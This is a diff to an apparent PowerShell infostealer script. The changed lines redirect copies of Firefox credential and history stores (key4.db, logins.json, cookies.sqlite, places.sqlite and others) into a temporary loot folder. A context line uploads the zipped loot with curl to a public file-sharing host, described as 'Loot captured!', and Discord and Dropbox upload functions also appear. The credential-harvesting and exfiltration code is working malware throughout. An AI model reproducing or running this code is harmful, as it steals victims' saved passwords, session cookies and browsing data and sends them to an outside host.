@@ -1189,14 +1189,14 @@ taskkill /IM firefox.exe /F
 Start-Sleep 1
 New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
 Get-Content $key4 > $env:TMP\$FolderName\Firefox\key4.db
-Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\logins.json
-Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\cookies.sqlite
-Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include downloads.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\downloads.json
-Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include profile.ini -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\profile.ini
-Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include places.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\places.sqlite
-Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include webappsstore.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\webappsstore.sqlite
-Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include storage.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\storage.sqlite
-Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include "storage-sync-v2.sqlite" -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\storage-sync-v2
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\logins.json
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\cookies.sqlite
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include downloads.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\downloads.json
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include profile.ini -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\profile.ini
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include places.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\places.sqlite
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include webappsstore.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\webappsstore.sqlite
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include storage.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\storage.sqlite
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include "storage-sync-v2.sqlite" -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Browsers\Firefox\storage-sync-v2
 }
 
 # Get Chrome Passwords
@@ -1663,7 +1663,7 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 ############################################################################################################################################################
 
 # Upload file to temp file storage
-$text = "**Final Data**: Loot captured! Here is the URL (It expires in 12 hours): "
+$text = "**Computer/Other Data**: Loot captured! Here is the URL (It expires in 12 hours): "
 $text += curl.exe -F "reqtype=fileupload" -F "time=12h" -F "fileToUpload=@$env:tmp/$ZIP" https://litterbox.catbox.moe/resources/internals/api.php
 
 function Upload-Discord {
